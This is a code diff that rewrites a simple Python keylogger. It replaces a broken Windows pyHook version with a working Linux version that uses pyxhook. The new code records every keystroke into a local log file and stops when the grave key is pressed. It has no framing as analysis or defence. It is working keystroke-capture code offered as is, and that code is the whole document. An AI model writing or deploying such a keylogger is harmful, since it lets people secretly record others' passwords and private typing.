@@ -1,14 +1,21 @@
-import pyHook,pythoncom,sys,logging 
+import pyxhook
+#change this to your log file's path
+log_file='/home/aman/Desktop/file.log'
 
-file_log ='/home/vigilante'
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+  fob=open(log_file,'a')
+  fob.write(event.Key)
+  fob.write('\n')
 
-def OnKeyboardEvent(Event):
-	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
-	chr(event.Ascii)
-	logging.log(10,chr(event.Ascii))
-	return True
-
-hooks_manager =pyHook.HookManager()
-hooks_manager.KeyDown= OnKeyboardEvent
-hooks_manager.HookKeyBoard()
-pythoncom.Pumpmessages
+  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+    fob.close()
+    new_hook.cancel()
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+#start the session
+new_hook.start()
